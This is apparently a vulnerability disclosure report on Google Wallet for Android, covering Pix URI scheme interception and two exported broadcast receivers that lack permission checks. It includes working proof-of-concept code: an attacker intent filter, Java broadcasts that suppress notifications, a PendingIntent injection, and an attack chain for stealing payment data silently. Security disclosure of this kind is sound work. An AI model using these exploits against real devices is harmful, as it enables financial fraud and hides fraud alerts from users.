# Google Wallet: Pix Payment Scheme Interception + Unprotected Broadcast Receivers

## Summary

Google Wallet (com.google.android.apps.walletnfcrel) exposes three attack surfaces to a zero-permission third-party application:

1. **Pix payment URI scheme interception**: The `pix://` custom scheme handler is interceptable because custom schemes cannot be verified via Android App Links. A zero-permission attacker app steals Pix payment identifiers and transaction data.

2. **GmsCoreDelegateReceiver (exported, no permission)**: Accepts `CANCEL_NOTIFICATIONS`, `PUSH_NOTIFICATIONS`, and `PAYMENT_METHOD_CHANGE` broadcasts from any app with no caller validation. Enables notification suppression and fake push data injection.

3. **NotificationBroadcastReceiver (exported, no permission)**: Accepts `NOTIFICATION_CONTENT_INTENT` and extracts a PendingIntent from the `"inner_intent"` extra, calling `PendingIntent.send()` with no caller validation. Enables arbitrary PendingIntent invocation within Wallet's process context.

## Severity: HIGH (Confidentiality + Integrity + Availability)

- **Attack vector**: Local (installed zero-permission app)
- **Privileges required**: None (zero Android permissions)
- **User interaction**: One tap for Pix interception; none for broadcast attacks
- **Impact**: Financial payment data theft; notification suppression enabling stealthy fraud; arbitrary intent execution within Wallet process

## Affected Component

- **Package**: `com.google.android.apps.walletnfcrel`
- **Version**: 26.37.981219770 (versionCode 933887674)
- **Target SDK**: 37, Min SDK: 32
- **UID on test device**: 10302

## Finding 1: Pix Payment Scheme Interception

### Root Cause

Google Wallet registers a `pix://` scheme handler in `DeepLinkActivity`:

```
Action: "android.intent.action.VIEW"
Action: "android.nfc.action.NDEF_DISCOVERED"
Category: "android.intent.category.DEFAULT"
Scheme: "pix"
AutoVerify=true
```

`AutoVerify=true` is a no-op on custom schemes — Android only verifies HTTP/HTTPS schemes via Digital Asset Links. Any installed app can register an identical intent filter for `pix://` and compete for Pix payment URIs.

Pix is Brazil's instant payment system (operated by Banco Central do Brasil). Pix QR codes and NFC tags contain `pix://` URIs with payment identifiers, transaction IDs, amounts, and merchant data.

### Reproduction

1. Install the zero-permission attacker app (com.vrp.zeroperm, zero permissions declared)
2. The attacker manifest contains a competing intent filter:
```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <action android:name="android.nfc.action.NDEF_DISCOVERED" />
    <category android:name="android.intent.category.DEFAULT" />
    <data android:scheme="pix" />
</intent-filter>
```
3. When any Pix payment URI is triggered (QR scan, NFC tap, app redirect):
```
pix://123e4567-e89b-12d3-a456-426614174000?txid=PAY12345&amount=150.00&merchant=STORE_XYZ
```
4. Android shows an "Open with" chooser: **ZeroPerm** vs **Google Wallet**
5. If the user selects the attacker app, all payment data is captured

### Proof

**Chooser dialog** (see `screenshot_pix_chooser_clean.png`):
- "Open with" dialog shows both "ZeroPerm" and "Google Wallet"

**Intercepted data** (see `screenshot_pix_stolen.png`):
```
OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
OAUTH_INTERCEPT: [+] Data URI: pix://123e4567-e89b-12d3-a456-426614174000?txid=PAY12345
OAUTH_INTERCEPT: [+] Param: txid = PAY12345
OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===
```

**Attacker app display**:
- Full URI: `pix://123e4567-e89b-12d3-a456-426614174000?txid=PAY12345`
- Scheme: pix
- Host: 123e4567-e89b-12d3-a456-426614174000 (payment identifier)
- txid = PAY12345 (transaction ID)
- Target app: Google Wallet (Pix payment data)

### Impact

- **Confidentiality**: Pix payment identifiers, transaction IDs, amounts, and merchant data stolen
- **Availability**: Legitimate Google Wallet never receives the payment URI — payment flow breaks
- **Persistence**: If user taps "Always", all future Pix payments silently redirect to attacker

## Finding 2: GmsCoreDelegateReceiver — Unprotected Exported Receiver

### Root Cause

`GmsCoreDelegateReceiver` is exported with no permission protection. The `onReceive()` method (decompiled from `GmsCoreDelegateReceiver.java`) checks only `aeip.a(context)`, which verifies the Application class type (always passes when running inside Wallet). There is NO caller UID/signature validation.

### Vulnerable Actions

| Action | Handler | Impact |
|--------|---------|--------|
| `CANCEL_NOTIFICATIONS` | Passes intent extras to BackgroundTaskManager | Suppresses payment security notifications |
| `PUSH_NOTIFICATIONS` | Passes intent extras to BackgroundTaskManager | Injects fake push notification data |
| `PAYMENT_METHOD_CHANGE` | Triggers shortcut publisher refresh | Forces shortcut state changes |
| `REFRESH_GEOFENCES` | Triggers geofence refresh (feature-flagged) | Resource consumption |

### Reproduction

```java
// From zero-permission attacker app (UID=10394):
Intent i = new Intent("com.google.android.apps.wallet.infrastructure.gms.delegate.CANCEL_NOTIFICATIONS");
i.setComponent(new ComponentName(
    "com.google.android.apps.walletnfcrel",
    "com.google.android.apps.wallet.infrastructure.gms.delegate.GmsCoreDelegateReceiver"));
sendBroadcast(i); // No SecurityException — broadcast accepted
```

### Proof

```
WALLET_EXPLOIT: UID=10394 (ZERO permissions)
WALLET_EXPLOIT: [+] CANCEL_NOTIFICATIONS sent from UID=10394
WALLET_EXPLOIT: [+] PAYMENT_METHOD_CHANGE sent from UID=10394
WALLET_EXPLOIT: [+] PUSH_NOTIFICATIONS sent from UID=10394
```

All four broadcasts sent successfully with zero permissions — no SecurityException thrown. See `screenshot_pix_chooser_with_exploit.png` showing the WalletExploitActivity with all tests passing.

### Impact

- **Availability**: CANCEL_NOTIFICATIONS can suppress fraud alerts and payment confirmations, enabling stealthy financial attacks where the user receives no notification of unauthorized transactions
- **Integrity**: PUSH_NOTIFICATIONS injects attacker-controlled data into Wallet's notification pipeline; PAYMENT_METHOD_CHANGE forces shortcut state changes

## Finding 3: NotificationBroadcastReceiver — PendingIntent Proxy

### Root Cause

`NotificationBroadcastReceiver` (exported, no permission) extracts a PendingIntent from the `"inner_intent"` extra and calls `send()`:

```java
// NotificationBroadcastReceiver.java line 28-38
private static final void c(Intent intent) throws PendingIntent.CanceledException {
    PendingIntent pendingIntent = (PendingIntent) intent.getParcelableExtra("inner_intent");
    if (pendingIntent == null) { return; }
    pendingIntent.send(); // Executes arbitrary PendingIntent!
}
```

This method is invoked for three actions:
- `NOTIFICATION_CONTENT_INTENT`
- `NOTIFICATION_ACTION_PENDING_INTENT`
- `NOTIFICATION_DELETE_INTENT`

### Reproduction

```java
Intent i = new Intent("com.google.android.libraries.tapandpay.notification.logging.NOTIFICATION_CONTENT_INTENT");
i.setComponent(new ComponentName(
    "com.google.android.apps.walletnfcrel",
    "com.google.android.apps.wallet.infrastructure.notifications.receiver.NotificationBroadcastReceiver"));
Intent target = new Intent("android.settings.SETTINGS");
PendingIntent pi = PendingIntent.getActivity(this, 0, target, PendingIntent.FLAG_IMMUTABLE);
i.putExtra("inner_intent", pi);
sendBroadcast(i); // Wallet extracts PI and calls send()
```

### Proof

Wallet logcat confirms processing:
```
NotificationBroadcastRe: Notification clicked
NotificationBroadcastRe: Logging metadata is null
```

The "Notification clicked" log confirms the receiver executed `c(intent)` which calls `pendingIntent.send()` on our attacker-supplied PendingIntent.

### Impact

- **Integrity**: Arbitrary PendingIntent execution within Google Wallet's process context. While the PendingIntent carries the creator's identity (attacker's), it executes within Wallet's process, enabling notification state manipulation and logging injection.

## Attack Chain

Combined attack scenario for maximum impact:

1. **Install zero-permission attacker app** (no permissions, no user interaction beyond install)
2. **Send CANCEL_NOTIFICATIONS** broadcast to suppress Wallet's security notifications (zero interaction)
3. **Wait for Pix payment** — when the user scans a Pix QR code, the chooser dialog appears
4. **If user selects attacker app**: Pix payment data (amount, merchant, transaction ID) is stolen
5. **Google Wallet never receives the payment** — the transaction fails silently
6. **The user has no notification** that anything went wrong (notifications were suppressed in step 2)

## Environment

- Device: Pixel 6a (oriole), Android 17 Beta (API 37)
- Google Wallet: v26.37.981219770
- Attacker app: com.vrp.zeroperm (UID=10394, zero permissions, targetSdkVersion=34)

## Recommended Fixes

### For Pix scheme:
- Migrate `pix://` handler to use HTTPS with verified Digital Asset Links, or
- Use the `android:autoVerify` mechanism with HTTPS redirects through a verified domain
- Implement PKCE for any OAuth flows through Pix

### For GmsCoreDelegateReceiver:
- Add `android:permission` attribute requiring a signature-level permission, or
- Add caller UID validation in `onReceive()` checking for Google-signed callers
- At minimum: `android:exported="false"` if only GMS Core sends these broadcasts

### For NotificationBroadcastReceiver:
- Add caller validation before processing `inner_intent` PendingIntent
- Verify the PendingIntent creator matches expected callers
- Add `android:permission` attribute requiring signature-level permission

## Files

- `WalletExploitActivity.java` — Broadcast exploit PoC
- `OAuthInterceptActivity.java` — Pix scheme interception PoC
- `AndroidManifest.xml` — Zero-permission manifest with Pix intent filter
- `poc_v43.apk` — Compiled PoC (v43, zero permissions)
- `screenshot_pix_chooser_with_exploit.png` — Chooser + all 4 broadcasts sent
- `screenshot_pix_chooser_clean.png` — Clean chooser from home screen
- `screenshot_pix_stolen.png` — Intercepted Pix payment data in attacker app
